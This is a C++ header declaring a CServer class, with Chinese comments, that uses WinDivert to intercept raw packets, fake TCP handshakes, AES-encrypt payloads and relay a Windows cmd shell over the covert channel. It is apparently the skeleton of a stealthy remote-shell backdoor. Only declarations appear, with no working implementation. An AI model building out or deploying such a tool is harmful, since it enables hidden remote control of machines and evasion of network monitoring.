#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <process.h>
#include "windivert.h"
#include "aes.h"

using namespace std;

#define SHELL_START "shell_start"
class CServer
{
private:
	UINT8* m_packet_template;
	UINT m_template_packet_len;
	WINDIVERT_ADDRESS* m_addr_template;
	HANDLE m_divert_handle;
	AES_CONTEXT m_aes_ctx;

	// shell用管道结构体
	HANDLE m_std_in_rd = NULL;
	HANDLE m_std_in_wr = NULL;
	HANDLE m_std_out_rd = NULL;
	HANDLE m_std_out_wr = NULL;
	HANDLE m_read_thread = NULL;
	PROCESS_INFORMATION m_proc_info;
	UINT m_thread_id;

public:
	CServer();
	~CServer();
	void start();

private:
	void set_packet_template(PVOID packet, UINT recv_len);								// 格式化标准发送包
	void set_addr_template(WINDIVERT_ADDRESS addr);
	void send_response_packet(PVOID packet, UINT recv_len);								// 发送确收包
	void send_data_packet(const char* payload_buf);										// 发送数据包
	BOOL init_divert(const char* filter);												// 初始化windivert
	void run_shell();																	// 打开shell
	void init_shell();
	void exit_shell();																	// 退出shell
	void add_seq(UINT seq);																// 添加标准包的seq
	void send_connect_reponse(PVOID packet, UINT recv_len);								// 模拟tcp三次握手
	static unsigned WINAPI read_from_cmd(void* ptr);									// 读取cmd输出线程
	void encrypt_payload(PVOID original_buf,  UINT buf_len);
	void decrypt_payload(PVOID encrypt_buf,  UINT buf_len);
	void print_ip_info(PWINDIVERT_IPHDR ip_header);
	bool recv_data_packet(PVOID packet_buf, PUINT payload_len, PVOID* payload_buf);
	void wait_for_connect();
};